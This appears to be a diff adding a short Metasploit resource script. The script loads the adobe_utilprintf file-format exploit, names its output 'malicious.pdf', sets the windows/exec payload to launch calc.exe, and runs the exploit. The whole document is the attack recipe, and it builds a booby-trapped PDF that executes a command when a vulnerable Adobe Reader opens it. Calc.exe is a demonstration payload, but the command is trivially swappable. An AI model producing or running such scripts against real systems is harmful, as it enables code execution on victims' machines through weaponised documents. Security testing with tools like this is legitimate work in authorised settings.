@@ -1,0 +1,6 @@
+use exploit/windows/fileformat/adobe_utilprintf
+set FILENAME malicious.pdf
+set PAYLOAD windows/exec
+set CMD calc.exe
+show options
+exploit
